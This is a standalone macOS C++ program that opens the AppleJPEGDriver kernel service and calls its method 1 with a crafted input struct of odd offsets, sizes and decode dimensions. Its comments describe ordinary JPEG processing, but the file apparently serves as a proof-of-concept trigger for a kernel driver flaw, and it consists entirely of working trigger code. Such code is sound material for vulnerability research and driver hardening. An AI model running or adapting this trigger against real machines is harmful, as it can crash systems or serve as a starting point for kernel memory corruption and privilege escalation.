// clang++ -framework IOKit -framework CoreFoundation -framework IOSurface AppleJPEGDriver_method_1.cpp -o AppleJPEGDriver_method_1
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>
#include <stdio.h>
#include <string.h>

/**
 * Creates an IOSurface with JPEG format specifications
 * IOSurface is a memory buffer that can be shared between processes and hardware
 * @return The unique identifier of the created surface
 */
static uint32_t create_surface(void) {
    // Create a mutable dictionary to hold surface properties
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, 
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    
    // Define basic surface properties
    // These values are minimal requirements for JPEG processing
    int width = 32, height = 32;     // Dimensions of the surface
    int size = 32768;                // Buffer size in bytes
    int format = 'JPEG';             // Surface pixel format
    
    // Set required surface properties in the dictionary
    // IOSurfaceIsGlobal: Makes surface accessible system-wide
    CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    // Set surface dimensions
    CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), 
        CFNumberCreate(NULL, kCFNumberSInt32Type, &width));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), 
        CFNumberCreate(NULL, kCFNumberSInt32Type, &height));
    // Set buffer size
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), 
        CFNumberCreate(NULL, kCFNumberSInt32Type, &size));
    // Set pixel format
    CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), 
        CFNumberCreate(NULL, kCFNumberSInt32Type, &format));
    
    // Create the surface and get its ID
    IOSurfaceRef surface = IOSurfaceCreate(dict);
    uint32_t id = IOSurfaceGetID(surface);
    CFRelease(dict);  // Clean up the dictionary
    return id;
}

/**
 * Input structure for the AppleJPEGDriver
 * This structure defines the parameters needed for JPEG processing operations
 * Total size: 88 bytes
 */
struct AppleJPEGDriverIOStruct {
    uint32_t src_surface;     // Source IOSurface ID
    uint32_t input_size;      // Size of input buffer
    uint32_t dst_surface;     // Destination IOSurface ID
    uint32_t output_size;     // Size of output buffer
    uint32_t reserved1[2];    // Reserved fields
    uint32_t pixelX;         // X dimension in pixels
    uint32_t pixelY;         // Y dimension in pixels
    uint32_t reserved2;       // Reserved field
    uint32_t xOffset;        // X offset for processing
    uint32_t yOffset;        // Y offset for processing
    uint32_t subsampling;    // Subsampling mode
    uint32_t callback;       // Callback function pointer
    uint32_t reserved3[3];    // Reserved fields
    uint32_t value100;       // Configuration value
    uint32_t reserved4[2];    // Reserved fields
    uint32_t decodeWidth;    // Width for decoding
    uint32_t decodeHeight;   // Height for decoding
    uint32_t reserved5;       // Reserved field
} __attribute__((packed));    // Ensure tight packing of structure

int main() {
    // Create two IOSurfaces: one for input, one for output
    uint32_t src = create_surface();
    uint32_t dst = create_surface();
    
    // Establish connection with AppleJPEGDriver
    io_connect_t conn;
    IOServiceOpen(IOServiceGetMatchingService(kIOMainPortDefault, 
        IOServiceMatching("AppleJPEGDriver")), mach_task_self(), 1, &conn);

    // Initialize the driver input structure with desired parameters
    struct AppleJPEGDriverIOStruct input = {
        .src_surface = src,          // Source surface ID
        .dst_surface = dst,          // Destination surface ID
        .input_size = 2000,          // Input buffer size
        .output_size = 0x1000,       // Output buffer size
        .pixelX = 100,               // X dimension
        .pixelY = 3,                 // Y dimension
        .xOffset = 0xd,              // X offset
        .yOffset = 0xff,             // Y offset
        .value100 = 100,             // Configuration value
        .decodeWidth = 5,            // Decode width
        .decodeHeight = 10           // Decode height
    };

    // Prepare output buffer for driver response
    char output[65536];
    size_t output_size = sizeof(output);
   
    // Call the driver's method 1 with our input structure
    kern_return_t kr = IOConnectCallStructMethod(conn, 1, &input, 
        sizeof(input), output, &output_size);
   
    // Print the result of the operation
    printf("Result: 0x%x (%s)\n", kr, mach_error_string(kr));
}